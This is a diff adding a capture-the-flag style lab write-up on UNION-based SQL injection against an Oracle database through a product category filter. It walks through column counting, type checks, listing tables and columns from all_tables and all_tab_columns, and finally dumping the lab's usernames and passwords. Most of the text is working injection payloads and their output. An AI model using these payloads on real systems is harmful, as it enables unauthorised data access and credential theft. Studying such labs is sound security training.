@@ -1,0 +1,53 @@
+SQL Injection Attack: List database contents on Oracle database
+SQLi Location: Product category filter
+
+End Goal:
+
+- Determine which table contains usernames and passwords
+- Determine the table columns
+- Output the table contents
+- Login as the administrator user
+
+ANALYSIS
+--------
+
+1. Determine the number of columns used by the vulnerable query
+
+' order by 1--  # 200 response code => Column exists
+' order by 2--  # 200 response code => Column exists
+' order by 3--  # Internal Server Error => Column doesn't exist
+
+Therefore, there are 2 columns that we can make use 
+
+2. Determine the data types of the columns
+
+' UNION select 'a', NULL from DUAL--  # 200 response code
+' UNION select NULL, 'a' from DUAL--  # 200 response code
+
+Both columns accept data of type text/string
+*** Note that for Oracle database, you need to specify a table - we use the default dummy table 'DUAL'
+
+3. Output the list of tables in the database (Refer to SQLi cheastsheet)
+
+' UNION SELECT table_name, NULL FROM all_tables--
+
+-> USERS_VPXBVC
+
+*** Lookup the relevant column names that you need to fetch from all_tables
+
+4. Output the column names of the users table
+
+' UNION SELECT column_name, NULL FROM all_tab_columns WHERE table_name = 'USERS_VPXBVC'--
+
+-> USERNAME_RWTJTK
+-> PASSWORD_IBGZXR
+
+*** Lookup the relevant column names that you need to fetch from all_tab_columns
+
+5. Output the list of usernames and passwords
+
+' UNION select USERNAME_RWTJTK, PASSWORD_IBGZXR from USERS_VPXBVC--
+
+-> administrator: z4sh8d180wbf8x40wbe8
+-> carlos: 6bjx6rh2kkjtu3gr0z3x
+-> wiener: 1g5jerz5ac8zphd81z58
